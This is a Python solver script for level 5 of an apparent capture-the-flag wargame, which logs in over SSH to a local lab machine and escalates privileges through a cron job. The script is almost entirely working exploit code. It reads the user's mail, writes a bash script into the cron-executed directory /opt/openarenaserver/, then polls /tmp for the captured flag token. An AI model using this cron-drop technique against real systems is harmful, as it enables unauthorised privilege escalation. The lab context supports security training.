"""Level05 - Cron-based Privilege Escalation"""

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

import time
from common.utils import ssh_cmd, scp_cmd, read_flag, save_flag


def exploit(host, port, ssh_port, pwd):
	"""Execute cron-based privilege escalation."""
	print(f"[*] Connecting to level05@{host}:{ssh_port}")
	code, out, err = ssh_cmd(host, ssh_port, "level05", pwd, "id")
	if code != 0:
		print("[!] SSH connection failed")
		return False, ""
	print(f"[+] SSH OK: {out.strip()}\n")

	code, mail, _ = ssh_cmd(host, ssh_port, "level05", pwd, "cat /var/mail/level05")
	if code == 0:
		print(f"[+] Mail: {mail.strip()}\n")

	script = "#!/bin/bash\nwhoami > /tmp/whoami.txt\nid >> /tmp/whoami.txt\ngetflag >> /tmp/whoami.txt 2>&1"
	create_cmd = f"cat > /opt/openarenaserver/exploit.sh << 'EOF'\n{script}\nEOF"
	ssh_cmd(host, ssh_port, "level05", pwd, create_cmd)
	print("[+] Exploit script created\n[*] Waiting for cron (~2 min)...")

	for i in range(6):
		time.sleep(10)
		print(f"[*] Progress: {(i+1)*10}s/120s")
		code, result, _ = ssh_cmd(host, ssh_port, "level05", pwd,
		                          "test -f /tmp/whoami.txt && cat /tmp/whoami.txt")
		if code == 0 and "flag05" in result:
			print("[+] Cron executed!")
			token_match = result.split("token : ")
			if len(token_match) > 1:
				print(f"[+] Success! Token: {token_match[1].strip()}")
				return True, token_match[1].strip()

	print("[!] Execution failed or timed out")
	return False, ""


def main():
	print("Level05 Cron Privilege Escalation Exploit\n")
	pwd = read_flag(4)
	success, token = exploit("localhost", 4747, 4242, pwd)

	if success:
		save_flag(5, token)
		print(f"[ANSWER]\n  Level05 Token: {token}")
	else:
		print("[!] Exploit failed")
		sys.exit(1)


if __name__ == "__main__":
	main()
